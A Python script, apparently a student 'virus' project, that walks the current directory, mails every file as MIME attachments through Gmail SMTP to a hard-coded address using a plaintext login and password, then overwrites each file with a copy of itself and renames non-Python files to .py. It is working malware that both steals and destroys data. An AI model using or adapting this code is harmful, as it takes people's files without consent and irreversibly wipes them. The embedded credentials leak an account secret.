
"""Send the contents of a directory and its subdirectories as a MIME message."""

import os
import sys
import smtplib
import shutil
# For guessing MIME type based on file name extension
import mimetypes


from email import encoders
from email.message import Message
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


def main():
      
    directory = os.getcwd()   #get current working directory
    if not directory:
        directory = '.'
        
        
    # Create the enclosing (outer) message
    outer = MIMEMultipart()
    sender = "hackerfxw@gmail.com"
    recipients = "josephxwf@gmail.com"
    outer['Subject'] = 'Contents of directory %s' % os.path.abspath(directory)
    outer['From'] = sender
    outer['To'] = recipients
    outer.preamble = 'You will not see this in a MIME-aware mail reader.\n'
    
  
    for dirpath, subdirs, files in os.walk(directory):
      
      for filename in files:#os.listdir(directory):
        
        path = os.path.join(directory, filename)     # get absolute path
        
        if not os.path.isfile(path):
            continue
        # Guess the content type based on the file's extension.  Encoding
        # will be ignored, although we should check for simple things like
        # gzip'd or compressed files.
        ctype, encoding = mimetypes.guess_type(path)
        if ctype is None or encoding is not None:
            # No guess could be made, or the file is encoded (compressed), so
            # use a generic bag-of-bits type.
            ctype = 'application/octet-stream'
        maintype, subtype = ctype.split('/', 1)
        
        
        if maintype == 'text':
            with open(path) as fp:
                # Note: we should handle calculating the charset
                msg = MIMEText(fp.read(), _subtype=subtype)
                
        elif maintype == 'image':
            with open(path, 'rb') as fp:
                msg = MIMEImage(fp.read(), _subtype=subtype)
        elif maintype == 'audio':
            with open(path, 'rb') as fp:
                msg = MIMEAudio(fp.read(), _subtype=subtype)
        else:
            with open(path, 'rb') as fp:
                msg = MIMEBase(maintype, subtype)
                msg.set_payload(fp.read())
            # Encode the payload using Base64
            encoders.encode_base64(msg)
            
     
        # Set the filename parameter
        msg.add_header('Content-Disposition', 'attachment', filename=filename)
        outer.attach(msg)
        
        #separate name and extension of files
        base = os.path.splitext(path)[0]         
        extention = os.path.splitext(path)[1]
    
        if filename !="proj1.py":
        
            shutil.copy("proj1.py",path) # use shutil.copy("assignment5.py","fp") will get extra file
            
        if extention != ".py":
           os.rename(path, base+".py")
          
        
    # Now send or store the message
    composed = outer.as_string()
    print(path)
    # connect to server 
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.ehlo()
    server.login("hackerfxw", "hackerfxw123")
    # send mail
    server.sendmail(sender, recipients, composed)
    server.quit()
    
    

if __name__ == '__main__':
    main()

